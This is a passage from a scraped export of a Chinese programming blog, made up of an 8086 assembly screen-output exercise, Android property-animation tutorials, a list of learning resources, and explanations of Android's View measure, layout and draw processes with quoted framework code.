123456789101112131415161718192021222324252627282930313233343536373839assume cs:code,ss:datacode segment mov ax,0b800h mov ds,ax mov bx,1760 mov ax,data mov ss,ax mov si,0 mov bp,0 mov cx,3s1: mov ss:[19],cx mov si,0 mov cx,16s2: mov di,si add di,di mov al,ss:[si] mov [bx+64+di],al mov al,ss:[16+bp] mov [bx+65+di],al inc si loop s2 inc bp add bx,160 mov cx,ss:[19] loop s1 mov ax,4c00h int 21hcode endsdata segment db &apos;welcome to masm!&apos; db 00000010b,00100100b,01110001b dw 0data endsend","tags":[{"name":"Assembly","slug":"Assembly","permalink":"http://www.viseator.com/tags/Assembly/"}]},{"title":"Android PropertyAnimation 属性动画（二）弹跳小球实例","date":"2017-04-02T02:08:31.000Z","path":"2017/04/02/android_property_animation_2/","text":"前言GitHub完整代码 上篇博客简单介绍了属性动画的原理，这篇博客将会以一个简单的实例来运用上之前讲的内容，并对Animator的几个回调方法进行讲解。 目标是自定义一个View，在画布上绘制一个小球，点击屏幕后小球从顶部自由下落，落到底边后反弹，反弹损失一半的能量，也就是说小球只能上升到下落时一半的高度，再重复这个过程直到退出程序。如图： 创建自定义View首先我们要创建一个自定义View，这里我就采用继承LinearLayout的方式来创建这个View，但要注意LinearLayout默认是不绘制自身的，需要在onDraw()方法之前适当的时候调用setWillNotDraw(false);令其进行绘制。 在继承LinearLayout的同时我们要实现全部三个构造方法，否则xml文件的预览解析会出现问题： 1234567891011public VView(Context context) &#123; super(context);&#125;public VView(Context context, AttributeSet attrs) &#123; super(context, attrs);&#125;public VView(Context context, AttributeSet attrs, int defStyleAttr) &#123; super(context, attrs, defStyleAttr);&#125; 创建好自定义View后，我们就可以在对应的layout xml布局文件中用完整包名+类名的方式使用我们的自定义View： 1234&lt;com.viseator.viewtest.VView android:layout_width=\"match_parent\" android:layout_height=\"match_parent\" /&gt; 同时，我们在绘制之前的onMeasure()方法中调用setWillNotDraw(false);使自定义View可以绘制： 123456@Overrideprotected void onMeasure(int widthMeasureSpec, int heightMeasureSpec) &#123; setWillNotDraw(false); setOnClickListener(this); super.onMeasure(widthMeasureSpec, heightMeasureSpec);&#125; 这里也调用了setOnClickListener()注册之后的点击事件。 绘制小球的绘制1234567891011121314151617181920private ValueAnimator animator;public static final int radius = 50;private int xPos = radius;private int yPos = radius;private Paint paint = new Paint();@Overrideprotected void onDraw(Canvas canvas) &#123; super.onDraw(canvas); if (animator == null) &#123; canvasHeight = canvas.getHeight() - radius; paint.setColor(getResources().getColor(R.color.Gray)); paint.setAntiAlias(true); &#125; drawCircle(canvas);&#125;void drawCircle(Canvas canvas) &#123; canvas.drawCircle(xPos, yPos, radius, paint);&#125; 这里第10行对是否是第一次绘制进行判断并将画布大小保存到canvasHeight供之后的绘制使用（之后的绘制的坐标需要相对于画布的坐标）并设置paint的属性。 drawCircle()方法也非常简单，只是调用canvas提供的drawCircle()方法指定位置与半径和之前设置的paint，调用后就会在屏幕上的对应位置绘制一个小球。 下落动画的绘制下面就要让小球“动”起来，其实并不是小球发生了移动，只是我们不停地改变小球绘制的位置，当绘制的速率（帧率）大于24帧时的，就在视觉上变成了流畅的动画。也就是说，我们需要使用Animator连续地改变小球的位置，为了实现加速的效果，位置的改变速率应该随时间增加，也就是需要我们上一篇博客提到的Evaluator来实现。 animator的初始化123456789void init(int start, int end) &#123; animator = ValueAnimator.ofInt(start, end); animator.setDuration(1000); animator.setRepeatCount(ValueAnimator.INFINITE); animator.setRepeatMode(ValueAnimator.RESTART); animator.setInterpolator(new AccelerateInterpolator(rate)); animator.addUpdateListener(this); animator.addListener(this);&#125; 写成一个初始化方法便于重新初始化。 第2行将传入的值区间的开始与结束值作为参数获得了一个值为int的ValueAnimator。 第3行设置了动画的时间为1秒。 第4、5行分别设置了动画的重复次数为无限次，重复模式为重新开始，顾名思义，动画可以重复进行，重新开始的重复模式意味着一次动画结束之后数值重新从start到end进行改变，也可以设置重复的模式为反向，即一次动画结束之后数值从end到start变化。 第六行为animator设置了一个库中提供的AccelerateInterpolator即加速插值器，这就是我们实现加速效果的关键，上篇之中已经看过它的源码，默认时返回的最终动画进行百分比是时间百分比的平方，达到了位置随着时间的平方变化，也就是实现了加速下落的效果。 第7、8两行分别为animator设置了一个UpdateListener用于监听数值变化，一个Listener用于监听animator本身开始、停止、重复。 完成下落动画创建好了ValueAnimator，下一步就是在适合的时候在画布上重新绘制位置参数被animator改变后的小球。注意到我们之前小球的y坐标存储在yPos变量中，我们只要适时令yPos等于改变后的值再通过invalidate()方法进入onDraw()方法让View按小球的参数重新进行绘制就可以了。 animator的ValueAnimator.AnimatorUpdateListener为我们提供了一个及时刷新View的时机，之前为animator注册一个UpdateListener之后，每当animator的值发生改变时，onAniamtionUpdate()就会被回调。 那我们就可以在这个回调方法中为yPos设置新的值并令View重新绘制： 12345@Overridepublic void onAnimationUpdate(ValueAnimator animation) &#123; yPos = (int) animation.getAnimatedValue(); invalidate();&#125; 这样，我们只要启动animator令它的值开始变化，就会不断地调用onAnimationUpdate()重绘View： 123456@Overridepublic void onClick(View v) &#123; init(radius, canvasHeight); animationHeight = canvasHeight + radius; animator.start();&#125; start()方法令animator开始。 到这里，我们已经可以看到点击屏幕后小球下落到底部并停止的效果。 回弹效果实现我们之前已经为animator设置了无限重复，并且模式为重新开始，那么要做到回弹的效果，就要在小球落到底边（动画完成）之后，为小球设置新的初始值与最终值，让小球从最低点回到落下时一半的高度。高度数据我们在onClick()中的第4行（上面代码）已经初始化为了相对于画布的高度，之后再使用时只需把它除2就可以表示圆心距底边的高度了。 Animator.AnimatorListener为我们提供了一系列方法用于监听animator状态的变化（而不是数值）： （除金色为Android 8新增外）依次为动画取消，动画结束，动画开始重复，动画开始。 这里我们就需要在onAnimationReapt()回调中为动画设置新的初值与结束数值： 123456789101112131415@Overridepublic void onAnimationRepeat(Animator animation) &#123; ValueAnimator vAnimation = (ValueAnimator) animation; if (isDown) &#123; animationHeight = (int) (animationHeight * 0.5); &#125; isDown = !isDown; if (isDown) &#123; vAnimation.setIntValues(canvasHeight - animationHeight, canvasHeight); vAnimation.setInterpolator(new AccelerateInterpolator()); &#125; else &#123; vAnimation.setIntValues(canvasHeight, canvasHeight - animationHeight); vAnimation.setInterpolator(new DecelerateInterpolator()); &#125;&#125; 回调参数中的animation就是回调这个函数的animator，第3行对其进行一个类型转换。 这里我们使用了一个isDown参数来判断是否是下落过程，如果上个动画是下落过程，就将animationHeight减半。 第7行把isDown置反，再根据isDown的判断使用setIntValues()方法为animator设置新的范围，使用setInterpolator()方法设置新的插值器，注意上升时使用的应该是DecelerateInterpolater减速上升。 这样在新的动画开始时属性改变的范围就得到了改变，也就使得小球可以反弹了。 为了让每一次点击时动画都可以重新开始，在onClick()方法中加入几行初始化代码： 12345678910@Overridepublic void onClick(View v) &#123; if (animator != null) &#123; animator.end(); &#125; init(radius, canvasHeight); animationHeight = canvasHeight + radius; isDown = true; animator.start();&#125; 这里第3-5行让如果存在的animator停止，否则新动画无法启动。 下篇博客将会从源码角度继续探索animator的实现原理和更高级的一些特性。 GitHub完整代码","tags":[{"name":"Android","slug":"Android","permalink":"http://www.viseator.com/tags/Android/"},{"name":"UI","slug":"UI","permalink":"http://www.viseator.com/tags/UI/"},{"name":"Animation","slug":"Animation","permalink":"http://www.viseator.com/tags/Animation/"}]},{"title":"Android PropertyAnimation 属性动画（一）初探","date":"2017-03-26T06:14:45.000Z","path":"2017/03/26/android_property_animation_1/","text":"前言相对于静态的页面，动画往往能更直观地表达所需的信息，在UI开发过程中起着相当大的作用。 Android为我们提供了一系列实现动画效果的方法，PropertyAnimaiton是最常见也是最实用的一种，如同它的名字一样，它的实现方式是通过改变对象的一系列属性值来改变对象的状态， 例如动态地改变绘制的位置就可以实现绘制物体的移动效果，动态地改变对象的显示状态可以实现闪烁效果。 Animator概览Android提供的实现属性动画的工具是android.animation.Animator这个类，它的使用需要配合animation包下的其他工具类，这个类的功能是什么，我们要如何使用它来实现属性动画呢？ 我们可以将Animator理解为Android为我们提供的一个按我们的需要在一定时间段内连续地计算并返回值的工具，这个值可以是通用的整型、浮点型，也可以是我们自定义的类型。 我们可以设置返回值的范围，并可以控制值变化的快慢，例如实现自由落体下落的物体时我们需要让高度值以一个越来越快的速度降低。 这里的连续需要注意，实际上是不可能产生真正意义上的连续值的，但是如果在绘制过程中计算这个值的速度小于绘制一帧所需要的时间，那么我们就可以在视觉上认为这个值是在连续改变的。这一点也是理解其作用的关键：我们很难去写出一个可以随时获取连续值的工具，而Animator正是一个满足我们这个需求的一个通用工具。 通过将Animator与View的绘制过程结合，就可以实现绝大多数的动画效果， 但是Animator也不只局限在使用在绘制动画，只要是有相似需求的地方都可以使用它来实现， 同时由于属性动画只针对属性进行修改，与被修改对象之前几乎没有耦合，不需要对被修改对象作出改变，可以设置方式也多种多样，这些都是动画的另一种实现方法ViewAnimator所无法做到的，所以我属性动画是现在实现动画效果的普遍做法。 使用AnimatorAnimator子类下面就来看看如何使用Animator满足我们的需求。 我们使用Animator可以分为两个步骤，一是进行数值的计算，二是将计算出的数值设置到对应的对象上。而Animator有着三个子类：ValueAnimator ObjectAnimator AnimatorSet。 ValueAnimator实现了上述过程的第一个步骤：进行数值的计算。第二个步骤则需要我们重写它的回调在值发生改变时候手动地为对象更新属性值。 ObjectAnimator则在其基础上进行了进一步的封装，加入了一些方法使得它可以绑定一个对象，在数值改变的同时对对象的属性进行更新。 AnimatorSet可以对Animator进行组合，让它们之间进行联动，例如可以设置一个动画根据另一个动画的状态来决定是否开始、暂停或停止。 可以看到，ValueAnimator提供了一个Animator最核心的内容，也是使用中最为灵活的一个。ObjectAnimator由于绑定了相应的对象，在使用上会受一些限制。AnimatorSet专用于需要组合动画的场景。 ValueAnimator在这篇博客中，我们关注最为核心的ValueAnimator。 关键属性ValueAnimator对象内部维护了一系列属性来保存所需的各种信息。 Duration：动画的持续时间，通过setDuration()方法设置 Repeat count and behavior：重复计数与重复模式，我们可以通过设置这两个属性来控制动画是否重复以及重复的次数，通过setRepeatCount()与setRepeatMode()方法设置 Frame refresh delay：帧刷新延迟，也就是计算两帧动画之间的间隔时间，但这个时间只是Animator尽力去保持的值，具体的间隔时间会由于系统负载与性能的不同而不同，同时设置它的方法为一个静态方法：ValueAnimator.setFrameDelay()，会被设置到所有的Animator上，这是因为这些Animator都在同一个时间循环中。这个属性也有可能会被忽略如果动画系统采用了内部的计时来源，例如vsync来计算属性。同时这个方法需要在与start()方法相同的进程中调用 Time interpolation：时间插值器，是我们实现不同动画效果的关键，每一时刻所返回的数值由它决定，后文会详细讲 初始化与TypeEvaluatorValueAnimator对象的构造函数只由内部使用，获取ValueAnimator对象的方法是调用它的工厂方法： ValueAnimator.ofArgb() ValueAnimator.ofInt() ValueAnimator.ofFloat() ValueAnimator.ofObject() ValueAnimator.ofPropertyValuesHolder() //本篇未涉及，下一篇进行讲解 前三个可以看作是ValueAnimator为我们提供的初始化方式，它们的参数都是对应类型的长度可变参数:(Type ...values)，我们需要提供一个以上的参数，ValueAnimator最终提供的值会在这些值之前变动。 一般情况下这里提供的Argb（用于颜色值的变化）和整型、浮点值基本可以满足我们的需求，但是某些时候我们需要结果是我们自定义的一些对象，这个时候就需要用到TypeEvaluator&lt;&gt;接口了，与这个接口对应的工厂方法是ValueAnimator.ofObject()： 12ValueAnimator ofObject (TypeEvaluator evaluator, Object... values) 这里的可变参数类型变为了Object，同时还需要我们提供一个TypeEvaluator&lt;&gt;，用于“告诉”Animator如何返回这个Object值。 TypeEvaluator&lt;&gt;接口并不复杂，只有一个方法需要我们重写： 123T evaluate (float fraction, T startValue, T endValue) startValue与endValue非常好理解，就是我们在获取Animator时指定的值的起始值和结束值。类型与返回类型一致，当然都是我们自定义的类型。 这里的fraction就是决定我们最终返回值的关键参数。我们可以把这个fraction理解为animator提供给我们的最终的数值改变的比例，以小数表示，小于0表示低于startValue，大于0表示超出endValue，0-1之间表示在startValue与endValue之间。我们要做的就是把这个值转换为在起始和结果范围之间的合适的对象值。 例如，对于基本的浮点类型，默认的FloatEvaluator是这样的： 1234public Float evaluate(float fraction, Number startValue, Number endValue) &#123; float startFloat = startValue.floatValue(); return startFloat + fraction * (endValue.floatValue() - startFloat);&#125; 可以看到，就是相当于把fraction所表示的比例“投射”到了我们所需要的数据对象上，这里是浮点类型。如果使用我们的自定义类型，我们必须为自己的类型定义这样的操作。 注意：这里要求我们必须将fraction线性地反应到对应的类型上，因为fraction反映的是最终的动画进度，我们必须如实地按照这个进度改变我们的属性，所以需要将result = x0 + t * (x1 - x0)`这样的形式反映到我们自己的对象上。 自定义了TypeEvaluator以后就可以作为参数使用在上面的obObject()工厂方法中了。 插补细分器(Interpolators)下面介绍使用ValueAnimator控制值变化过程中最为重要的一个概念：插补细分器(Interpolators)。 它实际上是一个关于时间的函数， 根据时刻的不同来返回不同的值，进而来控制最后的输出的值。那么它是如何表示的呢？ 系统为我们提供了一系列预置的Interpolators，以较常用的LinearInterpolater为例，顾名思义，它是一个线性的插补细分器，意味着输入与输出呈线性关系： 123public float getInterpolation(float input) &#123; return input;&#125; 输入输出的关键函数就是这个getInterpolation()了，可以看到，参数与返回值都是float类型，input的值在0-1之间，结合前面，我们可以很容易理解，这个input就是一个以0-1之间的小数表示的过去的时间值，例如整个动画是1000ms，当input为0.25的时候意味着现在的时间过去了250ms。 而返回值就是经过我们的转换，表示出的动画应该进行的时间的比例，这里由于是线性的，所以可以直接返回input，这个值最后会到哪里呢？自然就是给我们前面介绍的TypeEvaluator。下面一段源码展示了这个过程： 12345if (mInterpolator != null) &#123; fraction = mInterpolator.getInterpolation(fraction);&#125;return mEvaluator.evaluate(fraction, mFirstKeyframe.getValue(), mLastKeyframe.getValue()); 作为getInterpolation()参数的fraction代表着过去的时间比例，这里调用我们设置的Interpolator来更新这个fraction，现在这个fraction表示的就是动画已经进行的比例，下一步就要根据它来获取对应的对象值（调用了我们之间谈到过的evaluate()方法，这里的KeyFrame的概念会在之后的博客讲到），后面的两个参数就是传递给evaluate的起始与结束范围。 最终，我们就获得了一个按照我们设定的Interpolator返回的动画属性值。 如果想要实现加速效果呢？Android同样为我们提供了现成的AccelerateInterpolator： 1234567public float getInterpolation(float input) &#123; if (mFactor == 1.0f) &#123; return input * input; &#125; else &#123; return (float)Math.pow(input, mDoubleFactor); &#125;&#125; 同样很简洁，这里用到了mFactor与mDoubleFactor分别表示我们在构造函数里面设置的指数值： 1234public AccelerateInterpolator(float factor) &#123; mFactor = factor; mDoubleFactor = 2 * mFactor;&#125; 如果我们设置的为1，会返回input的平方，其他值则会返回input的mDoubleFactor次方，使得动画属性可以以不同的函数曲线形式变化。 如果我们要实现自己的Interpolator呢？只需要实现TimeInterpolator接口，这个接口只需要我们实现一个getInterpolation方法。我们可以根据input值返回不同的值来返回不同的值表示动画的进度。 注意：返回值的范围不一定要在0-1之间，小于0或大小1的值可以表示超出预设范围的目标值。 这篇博客到此结束，在下一篇博客中将会以一个绘制自由落体的弹跳小球的示例来演示如何使用Animator与介绍它的回调函数。","tags":[{"name":"Android","slug":"Android","permalink":"http://www.viseator.com/tags/Android/"},{"name":"UI","slug":"UI","permalink":"http://www.viseator.com/tags/UI/"},{"name":"Animation","slug":"Animation","permalink":"http://www.viseator.com/tags/Animation/"}]},{"title":"学习资源收集","date":"2017-03-25T15:43:06.000Z","path":"2017/03/25/resource_general/","text":"技术分类 资源类型 标题 链接 简介 C语言 书籍 C Primer Plus 链接 C语言推荐入门书籍 算法 网站 编程练习/算法练习/面试刷题 链接 在线编程及测试网站，体验良好，题目优秀，从易到难做 数据结构与算法分析 书籍 数据结构与算法分析：C语言描述 第2版 链接 数据结构与算法分析权威书籍 算法 书籍 算法 第4版 链接 算法学习推荐书籍，强烈建议配合网课(链接)进行学习 Java 书籍 Java核心技术 卷1：基础知识（原书第10版） 链接 Java语言推荐入门书籍 Java 书籍 Effective Java中文版（第2版） 链接 Java语言推荐进阶书籍 Java 书籍 Java核心技术 卷2：高级特性（原书第9版） 链接 Java语言推荐进阶书籍 生活 网站 V2EX 链接 程序员生活 计算机网络 书籍 计算机网络（第5版） 链接 计算机网络基础推荐书籍 操作系统 书籍 现代操作系统（原书第3版） 链接 操作系统推荐书籍 计算机网络 书籍 TCP/IP详解：卷1+卷2+卷3 链接 计算机网络进阶推荐书籍 Linux 公开课 Linux 入门基础 链接 Linux 入门基础 Android 博客 Android学习路线指南 链接 Android开发艺术探索一书的作者分享的安卓学习路线，供参考 Android 书籍 第一行代码 Android 第2版 链接 Android入门推荐书籍 Android 书籍 安卓Android开发艺术探索+Android群英传+源码设计模式解析 链接 Android进阶必读 计算机系统 书籍 深入理解计算机系统（原书第3版） 链接 理解计算机系统 汇编语言 书籍 汇编语言（第3版） 链接 汇编语言推荐书籍 汇编语言 博客 上面这本书的检测点与实验解析 链接 上面这本书的检测点与实验解析By2015级陈志浩 规范 书籍 重构 改善既有代码的设计 链接 改善代码质量的进阶书籍 Java 书籍 深入理解Java虚拟机：JVM高级特性与最佳实践（第2版） 链接 Java深入必读 Java 书籍 华章专业开发者丛书·Java并发编程实战 链接 Java并发编程推荐书籍 设计模式 书籍 O’Reilly：Head First设计模式（中文版） 链接 设计模式推荐书籍 iOS 书籍 Objective-C程序设计（第6版） 链接 Objective-C语言入门书籍 iOS 书籍 Objective-C基础教程(第2版) 链接 Objective-C语言入门书籍’ iOS 书籍 Effective Objective-C 2.0：编写高质量iOS与OS X代码的52个有效方法 链接 Objective-C与iOS开发提高","tags":[{"name":"Resource","slug":"Resource","permalink":"http://www.viseator.com/tags/Resource/"}]},{"title":"Android View绘制之onDraw过程与Canvas Bitmap","date":"2017-03-12T08:29:40.000Z","path":"2017/03/12/android_view_onDraw_canvas/","text":"draw()方法经过对View的测量与布局过程后，下面就到了真正的View绘制的过程了。这个过程从调用根View的draw()方法开始：（省略部分代码） 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647public void draw(Canvas canvas) &#123; final int privateFlags = mPrivateFlags; final boolean dirtyOpaque = (privateFlags &amp; PFLAG_DIRTY_MASK) == PFLAG_DIRTY_OPAQUE &amp;&amp; (mAttachInfo == null || !mAttachInfo.mIgnoreDirtyState); mPrivateFlags = (privateFlags &amp; ~PFLAG_DIRTY_MASK) | PFLAG_DRAWN; /* * Draw traversal performs several drawing steps which must be executed * in the appropriate order: * * 1. Draw the background * 2. If necessary, save the canvas' layers to prepare for fading * 3. Draw view's content * 4. Draw children * 5. If necessary, draw the fading edges and restore layers * 6. Draw decorations (scrollbars for instance) */ // Step 1, draw the background, if needed int saveCount; if (!dirtyOpaque) &#123; drawBackground(canvas); &#125; // skip step 2 &amp; 5 if possible (common case) final int viewFlags = mViewFlags; boolean horizontalEdges = (viewFlags &amp; FADING_EDGE_HORIZONTAL) != 0; boolean verticalEdges = (viewFlags &amp; FADING_EDGE_VERTICAL) != 0; if (!verticalEdges &amp;&amp; !horizontalEdges) &#123; // Step 3, draw the content if (!dirtyOpaque) onDraw(canvas); // Step 4, draw the children dispatchDraw(canvas); // Overlay is part of the content and draws beneath Foreground if (mOverlay != null &amp;&amp; !mOverlay.isEmpty()) &#123; mOverlay.getOverlayView().dispatchDraw(canvas); &#125; // Step 6, draw decorations (foreground, scrollbars) onDrawForeground(canvas); // we're done... return; &#125; 这段源码来自于View，过程非常清晰，执行了以下的步骤（如果需要）： 27-30行进行判断是否跳过注释中的第2、5步，通常情况跳过 22-24行，进行背景的绘制 32行，调用onDraw()方法进行自身的绘制 35行，调用dispatchDraw()方法，进行子View的绘制（调用子View的draw()方法），同时也表明了子View的绘制在自身之后这一顺序 43行，进行前景的绘制，一般为装饰组件，如滚动条等 dispatchDraw()方法onDraw()方法先不谈，看看dispatchDraw()方法做了什么，以ViewGroup为例：(省略部分代码) 12345678910111213@Overrideprotected void dispatchDraw(Canvas canvas) &#123; for (int i = 0; i &lt; childrenCount; i++) &#123; if ((transientChild.mViewFlags &amp; VISIBILITY_MASK) == VISIBLE || transientChild.getAnimation() != null) &#123; more |= drawChild(canvas, transientChild, drawingTime); &#125; &#125;&#125;protected boolean drawChild(Canvas canvas, View child, long drawingTime) &#123; return child.draw(canvas, this, drawingTime);&#125; 简单来看，依次调用了子View的draw()方法。所以对于有子View的ViewGroup， 我们需要重写这个方法来决定子View绘制的顺序。 Canvas Bitmap Surface间的联系背景与前景绘制的过程一般不由我们控制，自定义View时关键的内容就在onDraw()方法中。 你可能已经发现，在这些View绘制过程中的函数都具有一个参数Canvas，这个Canvas字面意义上为画布，那它实际上是什么，又在绘制过程中起着什么样的重要作用呢？ 我们可以把Canvas看作是系统给予我们的一个虚拟的对象，或者说是我们绘制图形的一个中介，Canvas具有一系列的方法可以供我们调用来直观地绘制图形，我们对于Canvas的所有操作都会被系统处理从而反映在屏幕上而不用我们去手动地决定哪一个像素应该显示什么颜色。 在Canvas背后则是一个Bitmap对象，我们的绘制实际上会反映在这个Bitmap上再交由系统来显示。如果我们需要自己创建一个Canvas，我们必须创建一个Bitmap对象作为Canvas的构造参数。例如： 12Bitmap b = Bitmap.createBitmap(100, 100, Bitmap.Config.ARGB_8888);Canvas c = new Canvas(b); 这样这个Canvas就会在指定的Bitmap上进行绘制，我们也可以通过Canvas的drawBitmap()方法来在指定的Bitmap上绘制。 那么问题来了，onDraw()方法给我们提供的这个Canvas是从哪里来的，为什么我们对它的操作可以反映到屏幕上？下面这张图便于我们去了解这个过程： 可以看到，我们的屏幕被分为了几个Window，每一个Window都有着自己的Surface，Surface具有两级缓存，每个缓存中存放着将要显示在屏幕上的像素数据，而当我们想要刷新屏幕显示新的内容时，对应的Surface将会读取缓存中的数据来进行更新。 onDraw()方法中的canvas就是在一个Surface显示完毕，将这个Surface锁定时由它返回的，在这个canvas上进行的操作就可以在下一次刷新屏幕时显示，但是实际上并不是由canvas直接写数据到它的Surface缓存中，这中间还有一个对象就是我们之前提到的Bitmap，Bitmap储存着的正是像素信息，而Surface返回的canvas中含有的就是一个指向Surface缓存的Bitmap。 梳理一下整个过程，我们需要做的是操作这个封装了一系列绘图方法的canvas，canvas将操作反映到内含的Bitmap上，Bitmap将数据反映给Surface的缓存，Surface在下一次刷新时读取缓存中的内容并显示到屏幕上。 这里还应注意的是每个Window有且仅有一个单继承（即只有一个根）的View树，View将会将Surface返回的canvas向下传递来让子View依次完成部分区域的绘制。 弄清楚这个canvas的来源之后，我们就可以放心地在用它来“作画”了。 onDraw()方法在onDraw()方法中我们可以对方法参数提供的canvas进行操作，绘制各种自定义的图形。 我们可以选择一个现有的View作为自定义View的父类，在它的onDraw()方法中一定要调用super.onDraw()来令它绘制本来的组件，我们可以在调用super.onDraw()之前或之后插入我们自己的代码，这取决你对绘制顺序的需要。 注意有些View如Linearlayout默认是不绘制自己的，也就是说它们并不会调用onDraw()方法，当我们需要继承这类View来进行自定义并进行绘制的话需要调用setWillNotDraw(false);。可以在onMeasure()方法中调用。 另一种方式是继承于View，可以更为自由地订制各种行为。 Canvas中封装了非常多的方法，下面列举一部分： drawArc)(float left, float top, float right, float bottom, float startAngle, float sweepAngle, boolean useCenter, Paint paint)：绘制椭圆 drawCircle)(float cx, float cy, float radius, Paint paint)：绘制圆形 drawColor)(int color)：对整个Canvas填充颜色 drawLine)(float startX, float startY, float stopX, float stopY, Paint paint)：绘制直线 drawLines)(float[] pts, int offset, int count, Paint paint)：绘制一系列直线 drawPicture)(Picture picture, Rect dst)：绘制一张图片 drawPoint)(float x, float y, Paint paint)：绘制一个点 drawPoints)(float[] pts, int offset, int count, Paint paint)：绘制一系列点 drawRect)(float left, float top, float right, float bottom, Paint paint)：绘制矩形 drawRoundRect)(RectF rect, float rx, float ry, Paint paint)：绘制圆角矩形 drawText)(CharSequence text, int start, int end, float x, float y, Paint paint)：绘制文字 drawTextOnPath)(String text, Path path, float hOffset, float vOffset, Paint paint)：沿路径绘制文字 方法的详细信息在官方文档中。 我们注意到，许多绘制方法都需要一个Paint参数， 这个Paint可以理解为系统为我们抽象出的一支画笔，我们所绘制的图形都是用这支画笔绘制出来的，当然因此我们就可以对画笔设置颜色、粗细等属性，我们甚至可以用setShader()方法为这个Paint设置一个Shader，来实现各种特殊的动态效果，Shader的使用需要另起一篇博客来讲。","tags":[{"name":"Android","slug":"Android","permalink":"http://www.viseator.com/tags/Android/"},{"name":"View","slug":"View","permalink":"http://www.viseator.com/tags/View/"}]},{"title":"Android View绘制之layout过程","date":"2017-03-12T06:02:47.000Z","path":"2017/03/12/android_view_onLayout/","text":"经过上一篇介绍的measure过程之后，各个View的尺寸信息已经存储在了每个View中，下面是layout过程，layout过程的目的是根据上一步中计算出的尺寸来正确设置各个View及其后代的位置。这个过程首先被调用的是View的layout()方法，layout()的方法签名是public void layout(int l, int t, int r, int b)，四个参数分别为左边界距父View左边界的距离，上边界距父View上边界的距离，右边界距父View左边界的距离，下边界距父View上边界的距离。 12boolean changed = isLayoutModeOptical(mParent) ? setOpticalFrame(l, t, r, b) : setFrame(l, t, r, b); changed是用于传递给onLayout()方法的参数，它指示了布局是否被改变。 后面的表达式查看了父View的布局模式是否需要显示边框，如需要，调用的是setOpticalFrame()方法： 12345678910private boolean setOpticalFrame(int left, int top, int right, int bottom) &#123; Insets parentInsets = mParent instanceof View ? ((View) mParent).getOpticalInsets() : Insets.NONE; Insets childInsets = getOpticalInsets(); return setFrame( left + parentInsets.left - childInsets.left, top + parentInsets.top - childInsets.top, right + parentInsets.left + childInsets.right, bottom + parentInsets.top + childInsets.bottom);&#125; 可以看到这个方法读取了设置的边框值， 把原值加上边框值后还是调用了setFrame()方法。 setFrame()方法通过传入的参数确定了该View最终的位置以及尺寸。 可以看到，一个View最终显示在什么位置以及它的尺寸是由layout()方法决定的，onMeasure()方法只是将测量出的View期望具有的大小储存在View中。一般情况下，我们会根据储存的这个尺寸来作为设定的依据。 接下来layout()方法会调用onLayout()方法，（如果需要的话）我们需要重写这个方法来调用子View的layout()方法。所以决定子View如何显示的关键步骤就在这里，他们的位置和尺寸完全取决于这里调用它们的layout()方法时传入的参数。当然一般情况下我们会根据子View中的测量结果来设置这个值。这里拿FrameLayout这个需要处理子View的ViewGroup实例来举例： 1234@Overrideprotected void onLayout(boolean changed, int left, int top, int right, int bottom) &#123; layoutChildren(left, top, right, bottom, false /* no force left gravity */);&#125; 直接调用了layoutChildren()：（省略部分行） 123456789101112131415161718192021222324252627282930313233343536void layoutChildren(int left, int top, int right, int bottom, boolean forceLeftGravity) &#123; final int count = getChildCount(); final int parentLeft = getPaddingLeftWithForeground(); final int parentRight = right - left - getPaddingRightWithForeground(); final int parentTop = getPaddingTopWithForeground(); final int parentBottom = bottom - top - getPaddingBottomWithForeground(); for (int i = 0; i &lt; count; i++) &#123; final View child = getChildAt(i); final int width = child.getMeasuredWidth(); final int height = child.getMeasuredHeight(); int childLeft; int childTop; switch (verticalGravity) &#123; case Gravity.TOP: childTop = parentTop + lp.topMargin; break; case Gravity.CENTER_VERTICAL: childTop = parentTop + (parentBottom - parentTop - height) / 2 + lp.topMargin - lp.bottomMargin; break; case Gravity.BOTTOM: childTop = parentBottom - height - lp.bottomMargin; break; default: childTop = parentTop + lp.topMargin; &#125; child.layout(childLeft, childTop, childLeft + width, childTop + height); &#125; &#125;&#125; 省略了与获取布局属性相关的代码，可以看到： 4-8行获取了父View的位置数据并在18-31行用于确定最终的位置数据 10-11行遍历了所有的子View 12-13行获取了子View中在上一步骤的测量过程中储存的宽和高，并用于第33行中设置最终的右边界与下边界 第33行调用子View的layout()方法","tags":[{"name":"Android","slug":"Android","permalink":"http://www.viseator.com/tags/Android/"},{"name":"View","slug":"View","permalink":"http://www.viseator.com/tags/View/"}]},{"title":"Android View绘制之measure过程","date":"2017-03-10T10:30:16.000Z","path":"2017/03/10/android_view_onMeasure/","text":"上一篇博客简单地介绍了View绘制的生命周期， 从这篇博客开始将会对这个周期中一些有用的过程进行一个详细一些的介绍。这篇的主角就是在构造方法之后调用的measure过程。 为了演示，继承了TextView来实现一个自定义的View。注意这里继承的应该是android.support.v7.widget.AppCompatTextView这个类。同时为了xml文件的正常解析，我们需要实现View的三个构造方法。 1234567891011public VView(Context context) &#123; super(context);&#125;public VView(Context context, AttributeSet attrs) &#123; super(context, attrs);&#125;public VView(Context context, AttributeSet attrs, int defStyleAttr) &#123; super(context, attrs, defStyleAttr);&#125; 再通过完整包名的方法在xml布局文件中创建我们的View就可以直接显示了。 12345&lt;com.viseator.viewtest.VView android:layout_width=\"100dp\" android:layout_height=\"100dp\" android:background=\"@color/Gray\" /&gt; 这里给了TextView一个背景颜色便于后面的观察。 下面就开始分析measure过程。 measure是一个自顶向下的过程，即父View会依次调用它的子View的measure()方法来对它的子View进行测量。 View的measure()方法最终会调用onMeasure()，真正的尺寸信息就是在onMeasure()方法中最终确定的。所以我们需要做的就是在自定义View中重写onMeasure()方法。 那么子View根据什么来确定自己应该具有的尺寸呢？当然不可能让子View自由地决定自己的大小，父View必然需要向子View传递信息来帮助子View来确定尺寸，而子View则必须满足父View的要求。查看measure()的方法签名： 1public final void measure(int widthMeasureSpec, int heightMeasureSpec) 这里的widthMeasureSpec与heightMeasureSpec就是存储这一信息的参数。它们的类型是int，内部以高两位来存储测量的模式，低三十位为测量的大小，计算中使用了位运算来提高并优化效率。当然我们不必使用位运算来获得对应的数值，View.MeasureSpec为我们提供了对应的方法。 测量模式有三种： EXACTLY：精确值模式，即子View必须使用这一尺寸，并且保证它们的所有后代都在这个范围之内。当我们将控件的layout_width、layout_height属性指定为具体数值或match_parent时，系统使用这一模式。 UNSPECIFIED：无限制模式，不对子View施加任何限制，完全由子View决定自己的大小。可以用于查看子View想要的尺寸，比如可以把子View的长度使用EXACTLY模式限制在100，不限制宽度来查看子View在长度为100情况想要的宽度。 